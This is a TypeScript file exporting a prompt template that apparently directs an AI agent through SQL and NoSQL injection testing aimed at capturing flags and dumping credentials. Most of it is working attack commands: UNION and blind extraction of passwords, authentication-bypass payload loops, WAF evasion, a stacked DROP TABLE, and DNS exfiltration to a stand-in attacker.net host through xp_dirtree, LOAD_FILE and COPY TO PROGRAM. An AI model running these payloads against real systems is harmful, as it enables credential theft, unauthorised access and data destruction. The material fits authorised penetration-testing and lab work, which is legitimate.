/**
 * SQL Injection testing methodology
 */

export const SQLI_TESTING_PROMPT = `
# SQL Injection Testing Methodology

You are testing for SQL Injection vulnerabilities. This includes both traditional SQL injection and NoSQL injection.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective (e.g., extracting the flag, dumping credentials, bypassing auth).

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Content validation matters** - HTTP 200 alone doesn't prove exploitation

## Testing Approach

### Step 1: Authentication (if required)

Before testing, ensure you have a valid session:

\`\`\`bash
# Authenticate and save session
curl -s -c cookies.txt -X POST "\$TARGET/login" \\
  -d "username=\$USER&password=\$PASS"

# Use session for subsequent requests
AUTH_HEADER="Cookie: \$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')"
\`\`\`

### Step 2: Detection - Identify Injection Points

**Start with basic detection payloads:**
\`\`\`bash
# Single quote test
curl -s "\$TARGET/api?id=1'"

# Boolean condition test
curl -s "\$TARGET/api?id=1' AND '1'='1"
curl -s "\$TARGET/api?id=1' AND '1'='2"

# Comment test
curl -s "\$TARGET/api?id=1'--"
\`\`\`

### Step 2b: Unquoted/Direct SQL Injection (WHERE Clause Injection)

**CRITICAL: Some applications concatenate parameters directly into SQL without quotes:**
\`\`\`javascript
// Vulnerable pattern - parameter goes directly into WHERE without quotes
sqlQuery = "SELECT * FROM products WHERE " + searchParam;
// Or: ORDER BY \${column}, LIMIT \${count}, etc.
\`\`\`

**Detection Pattern:**
When a parameter causes SQL errors with simple text but NOT with quotes:
- \`?search=test\` → Error ("Failed to fetch", "Invalid query", etc.) because \`WHERE test\` is invalid SQL
- \`?search=1=1\` → Success! Valid SQL: \`WHERE 1=1\` returns all rows

**Testing Methodology for Unquoted Injection:**
\`\`\`bash
# Step 1: Test if parameter causes error with plain text
curl -s "\$TARGET/api/products?search=test"
# If error occurs, the parameter might be directly concatenated

# Step 2: Test unquoted boolean conditions
curl -s "\$TARGET/api/products?search=1=1"      # Always TRUE - should return data
curl -s "\$TARGET/api/products?search=1=0"      # Always FALSE - should return nothing

# Step 3: If 1=1 returns data and 1=0 returns none/less, SQLi CONFIRMED
# Alternative TRUE conditions to try:
curl -s "\$TARGET/api/products?search=name LIKE '%'"     # Wildcard match
curl -s "\$TARGET/api/products?search=id>0"              # Numeric condition
curl -s "\$TARGET/api/products?search=true"              # Boolean (PostgreSQL)

# Step 4: Extract data via UNION (no quotes needed)
curl -s "\$TARGET/api/products?search=1=1 UNION SELECT username,password,null FROM users--"

# Step 5: Stacked queries (if supported)
curl -s "\$TARGET/api/products?search=1=1; DROP TABLE test--"
\`\`\`

**IMPORTANT:** When you see "Failed to fetch", "Database error", or similar errors with a query parameter:
1. ALWAYS test BOTH quoted (\`' OR '1'='1\`) AND unquoted (\`1=1\`) SQL syntax
2. Try valid SQL expressions without quotes first: \`1=1\`, \`id>0\`, \`name IS NOT NULL\`
3. Compare response between TRUE condition (1=1) and FALSE condition (1=0)

### Step 3: UNION Attack Methodology (PortSwigger Best Practice)

**Step 3a: Determine Column Count**

Use ORDER BY to find number of columns:
\`\`\`bash
# Increment until error
curl -s "\$TARGET/api?id=1' ORDER BY 1-- -"
curl -s "\$TARGET/api?id=1' ORDER BY 2-- -"
curl -s "\$TARGET/api?id=1' ORDER BY 3-- -"
# Error at N means N-1 columns exist
\`\`\`

Alternative - UNION SELECT NULL:
\`\`\`bash
curl -s "\$TARGET/api?id=1' UNION SELECT NULL-- -"
curl -s "\$TARGET/api?id=1' UNION SELECT NULL,NULL-- -"
curl -s "\$TARGET/api?id=1' UNION SELECT NULL,NULL,NULL-- -"
# Success when NULL count matches column count
\`\`\`

**Step 3b: Find String-Compatible Columns**
\`\`\`bash
# Test each position for string data
curl -s "\$TARGET/api?id=1' UNION SELECT 'a',NULL,NULL-- -"
curl -s "\$TARGET/api?id=1' UNION SELECT NULL,'a',NULL-- -"
curl -s "\$TARGET/api?id=1' UNION SELECT NULL,NULL,'a'-- -"
# Successful position shows 'a' in response
\`\`\`

**Step 3c: Extract Data**
\`\`\`bash
# Extract from known tables
curl -s "\$TARGET/api?id=1' UNION SELECT username,password,NULL FROM users-- -"

# Single-column extraction with concatenation
curl -s "\$TARGET/api?id=1' UNION SELECT username||'~'||password,NULL,NULL FROM users-- -"
\`\`\`

### Step 4: Blind SQLi Techniques

**Boolean-Based Blind:**
\`\`\`bash
# Character extraction - binary search approach
curl -s "\$TARGET/api?id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)>'m'-- -"

# Compare response lengths/content for TRUE vs FALSE
\`\`\`

**Error-Based Extraction:**
\`\`\`bash
# CAST to trigger type conversion errors
curl -s "\$TARGET/api?id=1' AND CAST((SELECT password FROM users LIMIT 1) AS int)-- -"

# extractvalue (MySQL)
curl -s "\$TARGET/api?id=1' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- -"
\`\`\`

**Time-Based Blind:**
\`\`\`bash
# MySQL
curl -s "\$TARGET/api?id=1' AND SLEEP(5)-- -"

# PostgreSQL
curl -s "\$TARGET/api?id=1'; SELECT pg_sleep(5)-- -"

# MSSQL
curl -s "\$TARGET/api?id=1'; IF (1=1) WAITFOR DELAY '0:0:5'-- -"

# Conditional time-based for data extraction
curl -s "\$TARGET/api?id=1'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'-- -"
\`\`\`

**Out-of-Band (OAST) Exfiltration:**
\`\`\`bash
# MSSQL - DNS exfiltration via xp_dirtree
curl -s "\$TARGET/api?id=1'; DECLARE @p varchar(1024);SET @p=(SELECT password FROM users WHERE username='admin');EXEC('master..xp_dirtree \"//'+@p+'.attacker.net/a\"')-- -"

# MySQL - DNS exfiltration
curl -s "\$TARGET/api?id=1' AND LOAD_FILE(CONCAT('\\\\\\\\',password,'.attacker.net\\\\a')) FROM users WHERE username='admin'-- -"

# PostgreSQL - DNS via COPY
curl -s "\$TARGET/api?id=1'; COPY (SELECT password FROM users) TO PROGRAM 'nslookup \`cat\`.attacker.net'-- -"
\`\`\`

### Step 5: Database-Specific Syntax

| Database | Comment | String Concat | Version Query |
|----------|---------|---------------|---------------|
| MySQL | \`-- \` (space!) or \`#\` | \`CONCAT(a,b)\` | \`@@version\` |
| PostgreSQL | \`--\` | \`a||b\` | \`version()\` |
| Oracle | \`--\` | \`a||b\` | \`SELECT banner FROM v$version\` |
| MSSQL | \`--\` | \`a+b\` | \`@@version\` |

**Oracle-Specific:**
\`\`\`bash
# Oracle requires FROM clause - use DUAL
curl -s "\$TARGET/api?id=1' UNION SELECT NULL,NULL FROM DUAL-- -"
curl -s "\$TARGET/api?id=1' UNION SELECT username,password FROM all_users-- -"
\`\`\`

### Step 6: WAF Bypass Techniques

\`\`\`bash
# Case variation
curl -s "\$TARGET/api?id=1' UnIoN SeLeCt username,password FROM users-- -"

# Comment injection
curl -s "\$TARGET/api?id=1' UN/**/ION SEL/**/ECT username,password FROM users-- -"

# XML encoding (for XML/SOAP inputs)
# &#x53;ELECT instead of SELECT

# Double URL encoding
curl -s "\$TARGET/api?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-"

# Alternative whitespace
curl -s "\$TARGET/api?id=1'%09UNION%09SELECT%09username,password%09FROM%09users--%09-"
\`\`\`

### Step 7: Authentication Bypass

\`\`\`bash
payloads=(
  "admin'-- -"
  "admin' OR '1'='1'-- -"
  "' OR 1=1-- -"
  "' OR ''='"
  "admin'/*"
  "') OR ('1'='1"
)
for payload in "\${payloads[@]}"; do
  curl -s -X POST "\$TARGET/login" -d "username=\$payload&password=x"
done
\`\`\`

### Step 8: NoSQL Injection (MongoDB)

\`\`\`bash
# Operator injection
curl -s -X POST "\$TARGET/login" \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":{"\$gt":""}}'

# $ne (not equal) bypass
curl -s -X POST "\$TARGET/login" \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":{"\$ne":"wrongpassword"}}'

# $regex extraction
curl -s -X POST "\$TARGET/login" \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":{"\$regex":"^a"}}'
\`\`\`

## Evidence Validation Checkpoint

**BEFORE documenting findings, verify you have AT LEAST ONE of:**
- Actual data extraction (table contents, column values, database records)
- UNION-based extraction with confirmed column enumeration
- SQL error message revealing database structure (table/column names, DB type)
- Boolean-based response difference (with TRUE vs FALSE comparison)
- Time-based delay (3+ seconds) WITH control comparison (baseline without injection)
- Out-of-band callback with data in DNS/HTTP request

**NOT EVIDENCE (do not report these alone):**
- HTTP 200 status code alone
- Generic application error without SQL details
- Response length difference without content analysis
- Single quote causing generic error
- ORDER BY causing error without confirmed column count

## Success Criteria

A valid SQLi finding must demonstrate:

1. **Authentication handled** - Session established or bypassed
2. **Exploitation confirmed** - Working technique identified with extracted data
3. **Evidence provided** - Actual data, error messages, timing differences, or OOB callbacks
4. **Objective progress** - Contribution to session goal (flag, data extraction)

## Remember

- **Test BOTH quoted AND unquoted injection** - If \`?param=test\` causes error, try \`1=1\` not just \`' OR '1'='1\`
- **Error on plain text = potential direct injection** - Test unquoted SQL expressions like \`1=1\`, \`id>0\`
- **UNION attacks require column enumeration first** - ORDER BY or NULL technique
- **Database-specific syntax matters** - Oracle needs DUAL, MySQL needs space after --
- **Blind SQLi requires control comparison** - Always compare TRUE vs FALSE responses
- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Validate response content** - status codes alone prove nothing
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
`;
